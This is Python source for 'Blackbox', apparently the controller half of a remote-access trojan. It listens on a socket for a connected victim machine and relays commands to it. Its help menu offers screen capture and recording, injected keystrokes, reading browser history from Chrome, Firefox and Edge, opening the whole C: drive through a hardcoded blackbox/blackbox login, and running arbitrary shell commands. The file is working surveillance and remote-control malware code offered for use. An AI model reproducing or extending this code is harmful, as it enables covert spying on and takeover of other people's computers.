from socket import socket
import os,art,stringcolor
import webbrowser
#setting window
class Blackbox(socket):
    __hostname = "127.0.0.1";
    __portname = 9999;
    @property
    def hostname(self):
        return str(Blackbox.__hostname);
    @property
    def portname(self):
        return int(Blackbox.__portname);
    def help(self):
        print(stringcolor.cs(str(art.text2art(
        """
        screenshoot filename   : screen capture
        screenrecord filename duration : screen recording
        message [text message] : message text
        keyup   [key]  : keyup keyboard 1 argument
        keydown [key]  : keydown keyboard 1 argument
        keypress[key]  : keypress keyboard 1 argument
        hotkeys [keys] : hotkeys max 4 arguments
        openurl [url]  : open url
        history [browserName] : chrome,firefox,edge,opera,chromium
        accesscomputer now : access all storage C:/
        option command : shell command
        """,'tiny2')),'green'));
    def connect_to_client(self):
        self.host = self.hostname;
        self.port = self.portname;
        self.bind((
            self.host,
            self.port
        ));
        self.listen(15);
        print(stringcolor.cs(str(
            art.text2art('menunggu koneksi...',
            'tiny2')),'green'));
        conn,addr = self.accept();
        print(stringcolor.cs(str(
            art.text2art(
                f'terhubung ke {addr[0]}',
                'tiny2')),'green'));
        print(stringcolor.cs(str(
            art.text2art('\tBLACKBOX\n',
            'sheqi')),'blue'));
        while True:
            self.styles = stringcolor.cs(str(art.art('lenny')),'blue')
            self.command = input(self.styles);
            if not self.command:pass;
            elif self.command in ['clear','cls']:
                if os.name == 'nt':os.system('cls');
                else:os.system('clear');
            elif self.command in ['exit','disconnect']:self.close();break;
            elif self.command == "accesscomputer now":
                conn.send(str(self.command).encode('utf-8'));
                self.response = conn.recv(8888).decode("utf-8");
                if self.response in ["access rights denied!","incomplete command!","command unknown!"]:
                    print("\n",self.response,"\n");
                else:
                    self.openURL = webbrowser.open(self.response);
                    if self.openURL == False:
                        print(f"Login[user : blackbox, pass : blackbox, URL : {self.response}]");
                    else:print("Login[user : blackbox, pass : blackbox]")
            elif self.command in ['help','Help']:self.help()
            else:
                conn.send(str(self.command).encode('utf-8'));
                print(conn.recv(8888).decode('utf-8'));
        self.close();
     
if __name__=="__main__":
    blackbox = Blackbox()
    blackbox.connect_to_client()